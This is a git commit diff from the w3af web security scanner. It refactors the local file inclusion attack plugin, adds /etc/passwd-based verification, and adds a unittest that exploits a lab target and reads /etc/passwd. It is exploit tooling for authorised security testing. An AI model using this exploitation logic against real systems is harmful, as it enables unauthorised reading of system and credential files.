b02a69b3fb204561aa1d324f36d0dfa439aa64dc
andresriancho <andresriancho@16c29cf1-982c-0410-8ff8-8bb040e68b5b>
2012-12-11 14:59:35 +0000

    * Refactoring for local_file_reader to remove fast_exploit * Using new cut method * Adding unittest

--- plugins/attack/local_file_reader.py
+++ plugins/attack/local_file_reader.py
@@ -22,14 +22,8 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 import base64
 
 import core.controllers.output_manager as om
-import core.data.kb.knowledge_base as kb
-import core.data.kb.vuln as vuln
 
-from core.data.options.opt_factory import opt_factory
-from core.data.options.option_list import OptionList
 from core.data.kb.read_shell import ReadShell
-from core.data.parsers.url import parse_qs
-
 from core.controllers.exceptions import w3afException
 from core.controllers.plugins.attack_plugin import AttackPlugin
 from core.controllers.misc.levenshtein import relative_distance_ge
@@ -46,32 +40,6 @@ class local_file_reader(AttackPlugin):
     def __init__(self):
         AttackPlugin.__init__(self)
 
-        # Internal variables
-        self._already_tested = []
-
-        # User configured variables
-        self._changeToPost = True
-        self._url = 'http://host.tld/'
-        self._method = 'GET'
-        self._data = ''
-        self._file_pattern = ''
-        self._generate_only_one = True
-
-    def fast_exploit(self):
-        '''
-        Exploits a web app with local file include vuln.
-        '''
-        if self._url == ''or self._file_pattern == '' or self._data == '':
-            om.out.error('You have to configure the "url" parameter.')
-        else:
-            v = vuln.vuln()
-            v.set_plugin_name(self.get_name())
-            v.set_url(self._url)
-            v.set_method(self._method)
-            v.set_dc(self._data)
-            v['file_pattern'] = self._file_pattern
-            kb.kb.append('lfi', 'lfi', v)
-
     def get_attack_type(self):
         '''
         @return: The type of exploit, SHELL, PROXY, etc.
@@ -80,13 +48,17 @@ class local_file_reader(AttackPlugin):
 
     def get_kb_location(self):
         '''
-        This method should return the vulnerability name (as saved in the kb) to exploit.
-        For example, if the audit.os_commanding plugin finds an vuln, and saves it as:
+        This method should return the vulnerability names (as saved in the kb)
+        to exploit. For example, if the audit.os_commanding plugin finds a
+        vuln, and saves it as:
 
         kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
 
-        Then the exploit plugin that exploits os_commanding ( attack.os_commanding ) should
-        return 'os_commanding' in this method.
+        Then the exploit plugin that exploits os_commanding
+        (attack.os_commanding) should return ['os_commanding',] in this method.
+        
+        If there is more than one location the implementation should return
+        ['a', 'b', ..., 'n']
         '''
         return ['lfi',]
 
@@ -95,23 +67,11 @@ class local_file_reader(AttackPlugin):
         @param vuln_obj: The vuln to exploit.
         @return: The shell object based on the vulnerability that was passed as a parameter.
         '''
-        # Check if we really can execute commands on the remote server
         if self._verify_vuln(vuln_obj):
 
-            if vuln_obj.get_method() != 'POST' and self._changeToPost and \
-                    self._verify_vuln(self.GET2POST(vuln_obj)):
-                msg = 'The vulnerability was found using method GET, but POST is being used during'
-                msg += ' this exploit.'
-                om.out.console(msg)
-                vuln_obj = self.GET2POST(vuln_obj)
-            else:
-                msg = 'The vulnerability was found using method GET, tried to change the method to'
-                msg += ' POST for exploiting but failed.'
-                om.out.console(msg)
-
-            # Create the shell object
             shell_obj = FileReaderShell(vuln_obj, self._uri_opener,
-                                        self._header_length, self._footer_length)
+                                        self._header_length,
+                                        self._footer_length)
 
             return shell_obj
 
@@ -124,8 +84,21 @@ class local_file_reader(AttackPlugin):
 
         @return : True if vuln can be exploited.
         '''
+        strict = self._strict_with_etc_passwd(vuln_obj)
+        if strict:
+            return True
+        else:
+            return self._guess_with_diff(vuln_obj)
+        
+    
+    def _guess_with_diff(self, vuln_obj):
+        '''
+        Try to define the cut with a relaxed algorithm based on two different
+        http requests.
+        
+        @return : True if vuln can be exploited and the information extracted
+        '''
         function_reference = getattr(self._uri_opener, vuln_obj.get_method())
-
         #    Prepare the first request, with the original data
         data_a = str(vuln_obj.get_dc())
 
@@ -148,59 +121,37 @@ class local_file_reader(AttackPlugin):
                                vuln_obj['file_pattern']):
                 return True
             else:
+                return False    
+    
+    def _strict_with_etc_passwd(self, vuln_obj):
+        '''
+        Try to define the cut with a very strict algorithm based on the
+        /etc/passwd file format.
+        
+        @return : True if vuln can be exploited and the information extracted
+        '''
+        function_reference = getattr(self._uri_opener, vuln_obj.get_method())
+        vuln_dc = vuln_obj.get_dc()
+        
+        # Check if we can apply a stricter extraction method
+        if 'passwd' in vuln_obj.get_mutant().get_mod_value():
+            try:
+                response_a = function_reference(vuln_obj.get_url(), str(vuln_dc),
+                                                cache=False)
+                response_b = function_reference(vuln_obj.get_url(), str(vuln_dc),
+                                                cache=False)
+            except w3afException, e:
+                om.out.error(str(e))
                 return False
-
-    def get_options(self):
-        '''
-        @return: A list of option objects for this plugin.
-        '''
-        d0 = 'If the vulnerability was found in a GET request, try to change the method to POST'
-        d0 += ' during exploitation.'
-        h0 = 'If the vulnerability was found in a GET request, try to change the method to POST'
-        h0 += ' during exploitation; this is usefull for not being logged in the webserver logs.'
-        o0 = opt_factory(
-            'changeToPost', self._changeToPost, d0, 'boolean', help=h0)
-
-        d1 = 'URL to exploit with fast_exploit()'
-        o1 = opt_factory('url', self._url, d1, 'url')
-
-        d2 = 'Method to use with fast_exploit()'
-        o2 = opt_factory('method', self._method, d2, 'string')
-
-        d3 = 'Data to send with fast_exploit()'
-        o3 = opt_factory('data', self._data, d3, 'string')
-
-        d4 = 'The file pattern to search for while verifiyng the vulnerability.'
-        d4 += ' Only used in fast_exploit()'
-        o4 = opt_factory('file_pattern', self._file_pattern, d4, 'string')
-
-        d5 = 'Exploit only one vulnerability.'
-        o5 = opt_factory(
-            'generateOnlyOne', self._generate_only_one, d5, 'boolean')
-
-        ol = OptionList()
-        ol.add(o0)
-        ol.add(o1)
-        ol.add(o2)
-        ol.add(o3)
-        ol.add(o4)
-        ol.add(o5)
-        return ol
-
-    def set_options(self, options_list):
-        '''
-        This method sets all the options that are configured using the user interface
-        generated by the framework using the result of get_options().
-
-        @param options_list: A dict with the options for the plugin.
-        @return: No value is returned.
-        '''
-        self._changeToPost = options_list['changeToPost'].get_value()
-        self._url = options_list['url'].get_value()
-        self._method = options_list['method'].get_value()
-        self._data = parse_qs(options_list['data'].get_value())
-        self._file_pattern = options_list['file_pattern'].get_value()
-        self._generate_only_one = options_list['generateOnlyOne'].get_value()
+            
+            try:
+                cut = self._define_cut_from_etc_passwd(response_a.get_body(),
+                                                       response_b.get_body())
+            except ValueError, ve:
+                om.out.error(str(ve))
+                return False
+            else:
+                return cut
 
     def get_root_probability(self):
         '''
@@ -221,15 +172,7 @@ class local_file_reader(AttackPlugin):
         This plugin exploits local file inclusion and let's you "cat" every file you want.
         Remember, if the file in being read with an "include()" statement, you wont be able
         to read the source code of the script file, you will end up reading the result of the
-        script interpretation. You can also use the "list" command to list all files inside
-        the known paths.
-
-        Six configurable parameters exist:
-            - changeToPost
-            - url
-            - method
-            - data
-            - generateOnlyOne
+        script interpretation.
         '''
 
 PERMISSION_DENIED = 'Permission denied.'
@@ -256,38 +199,6 @@ class FileReaderShell(ReadShell):
         self._use_base64_wrapper = False
 
         self._init_read()
-
-    def help(self, command):
-        '''
-        Handle the help command.
-        '''
-        if command == 'help':
-            om.out.console('')
-            om.out.console('Available commands:')
-            om.out.console('    help                            Display this information')
-            om.out.console('    read                            Echoes the contents of a file.')
-            om.out.console('    download                        Downloads a file to the local filesystem.')
-            om.out.console('    list                            List files that may be interesting.')
-            om.out.console('                                    Type "help list" for detailed information.')
-            om.out.console(
-                '    exit                            Exit the shell session')
-            om.out.console('')
-        elif command == 'read':
-            om.out.console('read help:')
-            om.out.console('    The read command echoes the content of a file to the console. The')
-            om.out.console('    command takes only one parameter: the full path of the file to ')
-            om.out.console('    read.')
-            om.out.console('')
-            om.out.console('Examples:')
-            om.out.console('    read /etc/passwd')
-        elif command == 'download':
-            om.out.console('download help:')
-            om.out.console('    The download command reads a file in the remote system and saves')
-            om.out.console('    it to the local filesystem.')
-            om.out.console('')
-            om.out.console('Examples:')
-            om.out.console('    download /etc/passwd /tmp/passwd')
-        return True
 
     def _init_read(self):
         '''
@@ -331,8 +242,8 @@ class FileReaderShell(ReadShell):
                 om.out.debug('Using base64 wrapper for reading.')
                 self._use_base64_wrapper = True
             else:
-                msg = 'Not using base64 wrapper for reading because response did'
-                msg += ' not match "root:" or "/bin/".'
+                msg = 'Not using base64 wrapper for reading because response' \
+                      ' did not match "root:" or "/bin/".'
                 om.out.debug(msg)
 
     @read_debug
---
+++ plugins/tests/attack/test_local_file_reader.py
@@ -0,0 +1,87 @@
+'''
+test_file_upload.py
+
+Copyright 2012 Andres Riancho
+
+This file is part of w3af, w3af.sourceforge.net .
+
+w3af is free software; you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation version 2 of the License.
+
+w3af is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with w3af; if not, write to the Free Software
+Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+'''
+from plugins.tests.helper import PluginTest, PluginConfig
+
+
+class TestFileReadShell(PluginTest):
+
+    target_url = 'http://moth/w3af/audit/local_file_inclusion/'
+
+    _run_configs = {
+        'cfg': {
+            'target': target_url,
+            'plugins': {
+                'audit': (PluginConfig('lfi'),),
+                'crawl': (
+                    PluginConfig(
+                        'web_spider',
+                        ('only_forward', True, PluginConfig.BOOL)),
+                )
+
+            }
+        }
+    }
+
+    def test_find_exploit_lfi(self):
+        # Run the scan
+        cfg = self._run_configs['cfg']
+        self._scan(cfg['target'], cfg['plugins'])
+
+        # Assert the general results
+        vulns = self.kb.get('lfi', 'lfi')
+        self.assertEquals(2, len(vulns), vulns)
+        
+        vuln = vulns[0]
+        
+        self.assertEquals(vuln.get_name(), "Local file inclusion vulnerability")
+        
+        vuln_to_exploit_id = vuln.get_id()
+
+        plugin = self.w3afcore.plugins.get_plugin_inst('attack', 'local_file_reader')
+
+        self.assertTrue(plugin.can_exploit(vuln_to_exploit_id))
+
+        exploit_result = plugin.exploit(vuln_to_exploit_id)
+
+        self.assertEqual(len(exploit_result), 1, exploit_result)
+
+        #
+        # Now I start testing the shell itself!
+        #
+        shell = exploit_result[0]
+        etc_passwd = shell.generic_user_input('read', ['/etc/passwd'])
+        self.assertTrue('root' in etc_passwd)
+
+        lsp = shell.generic_user_input('lsp', [])
+        self.assertTrue('apache_config_directory' in lsp)
+
+        payload = shell.generic_user_input('payload', ['apache_config_directory'])
+        self.assertTrue(payload is None)
+
+        _help = shell.help(None)
+        self.assertNotIn('execute', _help)
+        self.assertNotIn('upload', _help)
+        self.assertIn('read', _help)
+        
+        _help = shell.help('read')
+        self.assertIn('read', _help)
+        self.assertIn('/etc/passwd', _help)
+        
